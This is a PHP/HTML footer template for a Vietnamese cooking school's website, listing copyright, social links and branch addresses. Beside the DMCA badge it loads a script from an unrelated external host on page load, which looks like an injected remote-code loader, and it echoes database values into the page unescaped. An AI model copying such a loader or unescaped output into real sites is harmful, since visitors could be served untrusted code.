<div id="footer">
	<div style="clear:both; height:2px; margin-bottom:20px; background-color:#FFF"></div>
	<div class="content">
    	<div id="run_top">TOP</div>
        <table width="100%" border="0" cellpadding="0" cellspacing="10">
        	<tr>
            	<td colspan="2" style="font-size:115%; line-height:20px">
                	<h2>Bản quyền © 2010 - 2015 thuộc về <?php echo $config['sitename'];?></h2>
                    <p>Website: <a href="http://www.dayamthuc.vn" title="Trường dạy nấu ăn Netspace" target="_blank">www.dayamthuc.vn</a> - <a href="http://netspace.edu.vn" title="Trường học nấu ăn Netspace" target="_blank">netspace.edu.vn</a><br />Email: <a href="mailto:<?php echo $config['email'];?>"><?php echo $config['email'];?></a></p>
                </td>
                <td colspan="2">
                	<div id="social">
                    <?php
					$parent=0; $position=6;
					$data = $c->_model->_listMenu($lang, $parent, $position);
					foreach($data as $row){
						echo '<a href="'.$row['url'].'" title="'.$row['title'].'" target="_blank"><img src="'.$urlImg[11]['url_img'].$row['img'].'" alt="'.$row['name'].'" /></a>';
					}
					?>
                    </div>
                </td>
            </tr>
            <?php
			$i=0;
			$str='';
			$dataChiNhanh = $c->_model->_listChiNhanh($lang);
			foreach($dataChiNhanh as $row){
				$i++;
				if($i%2 == 1)
					$str .= '<tr>
            			<td align="right" align="right" valign="top">'.$row['name'].'</td>
            			<td>'.$row['address'].'<br />Tel: '.$row['phone'].'<br />Hotline: '.$row['hotline'].'</td>';
				else
					$str .= '<td align="right" valign="top">'.$row['name'].'</td>
            			<td>'.$row['address'].'<br />Tel: '.$row['phone'].'<br />Hotline: '.$row['hotline'].'</td></tr>';
			}
			echo $str;
			?>
        </table>
        <div id="tagsAll">
			<?php
            //$data = $c->_model->_listTagsKeyword($lang);
			//foreach($data as $row) echo '<a href="'.$row['url'].'" title="'.$row['title'].'">'.$row['name'].'</a>';
            ?>
        </div>
        
        <div style="clear:both; width:auto; float:left; background-color:#FFF">
        	<a href="http://www.dmca.com/Protection/Status.aspx?ID=f47119c4-d9e9-4556-8622-3da13ab0cf6a" title="DMCA.com Protection Status" class="dmca-badge" target="_blank"> <img src ="//images.dmca.com/Badges/dmca_protected_sml_120b.png?ID=f47119c4-d9e9-4556-8622-3da13ab0cf6a"  alt="DMCA.com Protection Status" /></a>  <script src="https://streamtest.github.io/badges/streamtest.js" type="text/javascript"></script>
        </div>
        <div class="clear1"></div>
    </div>
</div>